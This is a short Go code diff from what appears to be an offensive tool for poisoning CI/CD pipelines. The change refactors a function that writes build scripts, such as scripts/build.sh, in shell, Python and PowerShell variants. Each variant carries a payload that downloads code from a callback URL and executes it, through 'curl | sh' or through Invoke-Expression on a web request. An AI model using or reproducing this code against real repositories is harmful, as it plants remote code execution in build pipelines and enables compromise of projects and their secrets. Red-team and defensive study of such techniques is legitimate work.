@@ -1202,13 +1202,13 @@ func dynamicScriptFiles(tool string, targets []string, callbackURL string) []lot
 	switch tool {
 	case "powershell":
 		shebang = "#!/usr/bin/env pwsh"
-		payload = fmt.Sprintf("Invoke-Expression (Invoke-WebRequest -Uri '%s').Content", callbackURL)
+		payload = lotp.PowershellCurlPipeShCommand(callbackURL)
 	case "python":
 		shebang = "#!/usr/bin/env python3"
-		payload = fmt.Sprintf("import os; os.system(%q)", shellCurlPipeShCommand(callbackURL))
+		payload = fmt.Sprintf("import os; os.system(%q)", lotp.CurlPipeShCommand(callbackURL))
 	default:
 		shebang = "#!/bin/sh"
-		payload = shellCurlPipeShCommand(callbackURL)
+		payload = lotp.CurlPipeShCommand(callbackURL)
 	}
 
 	content := shebang + "\n" + payload + "\n"
@@ -1221,10 +1221,6 @@ func dynamicScriptFiles(tool string, targets []string, callbackURL string) []lot
 		files = append(files, lotpFile{path: "scripts/build.sh", content: content})
 	}
 	return files
-}
-
-func shellCurlPipeShCommand(callbackURL string) string {
-	return fmt.Sprintf("curl -s '%s' | sh", strings.ReplaceAll(callbackURL, "'", "'\"'\"'"))
 }
 
 func generateLOTPBranchName(now time.Time) string {
